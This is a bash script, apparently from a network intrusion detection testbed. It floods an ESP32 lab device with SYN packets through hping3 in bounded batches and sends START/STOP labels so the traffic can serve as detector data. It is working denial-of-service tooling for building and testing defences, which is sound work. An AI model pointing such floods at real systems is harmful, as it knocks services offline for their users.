#!/usr/bin/env bash
# SYN flood + labeling through a routed virtual NIC (no Wi-Fi association).
# Usage: sudo -E ./host/attacks/syn_flood.sh
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

# Automated runs require acknowledged raw labels and a bounded lifetime.
label() {
  if [[ "${NIDS_REQUIRE_LABEL_ACK:-0}" == 1 ]]; then
    send_label_confirmed "$1" SYN_FLOOD
  else
    send_label "$1" SYN_FLOOD
  fi
}
LABEL_ACTIVE=0
ATTACK_PID=""
cleanup() {
  local rc=$?
  trap - EXIT
  if [[ -n "$ATTACK_PID" ]]; then
    kill -TERM "$ATTACK_PID" 2>/dev/null || true
    wait "$ATTACK_PID" 2>/dev/null || true
  fi
  if [[ "$LABEL_ACTIVE" == 1 ]]; then
    label STOP || rc=1
  fi
  exit "$rc"
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM HUP

TARGET_IP="$(get_esp32_ip)"
TARGET_PORT="${NIDS_TARGET_PORT:-80}"
SYN_IFACE="${NIDS_SYN_IFACE:-eth0}"

echo ">>> Target ESP32 IP : ${TARGET_IP}:${TARGET_PORT}"
echo ">>> Out interface   : $SYN_IFACE"
echo ">>> Label host      : $(get_label_host):${LABEL_PORT}"
ensure_label_path || exit 1
ip -4 addr show dev "$SYN_IFACE" | grep -q 'inet ' || {
  echo "No IPv4 on $SYN_IFACE; check VirtualBox NAT/bridged adapter and DHCP" >&2; exit 1;
}
ROUTE_IFACE="$(ip -4 route get "$TARGET_IP" | awk '{for(i=1;i<NF;i++) if($i=="dev") {print $(i+1); exit}}')"
if [[ "$ROUTE_IFACE" != "$SYN_IFACE" ]]; then
  echo "Target route uses '${ROUTE_IFACE}', expected '${SYN_IFACE}'; fix VM routing first" >&2
  exit 1
fi
if ! ping -I "$SYN_IFACE" -c 1 -W 2 "$TARGET_IP" >/dev/null 2>&1; then
  echo ">>> ERROR: cannot ping ${TARGET_IP} via ${SYN_IFACE}; check routing/firewall (not Wi-Fi association)" >&2
  exit 1
fi
echo ">>> READY FOR SYN FLOOD"

command -v hping3 >/dev/null
command -v timeout >/dev/null
# The target must actually route through the selected experiment interface.
LABEL_ACTIVE=1
label START
sleep 1

batch_count=5000
repeats=10
for ((i=1; i<=repeats; i++)); do
  echo ">>> Batch ${i}/${repeats}: flooding ${batch_count} SYN packets"
  timeout --signal=TERM --kill-after=2 10 hping3 -S -p "$TARGET_PORT" -c "$batch_count" --flood \
    -I "$SYN_IFACE" "$TARGET_IP" &
  ATTACK_PID=$!
  rc=0
  wait "$ATTACK_PID" || rc=$?
  ATTACK_PID=""
  if [[ "$rc" != 0 && "$rc" != 124 ]]; then
    echo "Traffic generator failed: $rc" >&2; exit "$rc";
  fi
  sleep 2
done

sleep 1
label STOP
LABEL_ACTIVE=0
echo " >>> ATTACK FINISHED"
